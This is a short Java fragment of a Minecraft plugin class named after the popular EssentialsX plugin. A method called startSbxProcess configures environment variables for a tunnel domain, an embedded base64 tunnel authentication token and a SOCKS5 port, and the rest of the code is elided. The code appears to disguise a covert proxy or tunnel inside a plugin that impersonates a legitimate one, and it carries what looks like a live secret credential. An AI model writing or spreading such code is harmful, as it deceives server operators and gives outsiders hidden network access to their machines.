...
public class EssentialsX extends JavaPlugin {
    ...
    private void startSbxProcess() throws Exception {
        ...
        env.put("ARGO_DOMAIN", "later.3211.qzz.io");
        env.put("ARGO_AUTH", "eyJhIjoiNDMxMmY5YTAwNzhjMTI1OTYyZTAwZDY5NzkwMTgxNTMiLCJ0IjoiZDc0ZDEyMzktOGRkMy00ZmJmLWIzNTEtMGQxOTdkOTE5NDI3IiwicyI6Ill6STFZbUkzTmpBdE56VmtPUzAwTlRSa0xXRmtOakV0WldVNVlqVmlNR1ptWXpJeSJ9");
        env.put("S5_PORT", "");
